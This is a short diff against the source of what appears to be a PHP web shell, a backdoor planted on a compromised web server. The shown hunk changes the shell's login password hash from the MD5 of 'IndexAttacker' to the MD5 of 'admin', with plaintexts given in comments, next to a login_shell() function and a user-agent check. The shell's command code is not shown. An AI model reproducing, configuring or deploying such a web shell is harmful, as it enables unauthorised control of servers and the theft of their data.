@@ -22,7 +22,7 @@ if (!empty($_SERVER['HTTP_USER_AGENT'])) {
 	}
 }
 
-$password = "d9ae02b7c3456bbc23ef73e93bc2c88a"; // md5 : IndexAttacker
+$password = "21232f297a57a5a743894a0e4a801fc3"; // md5 : admin
 
 function login_shell()
 {
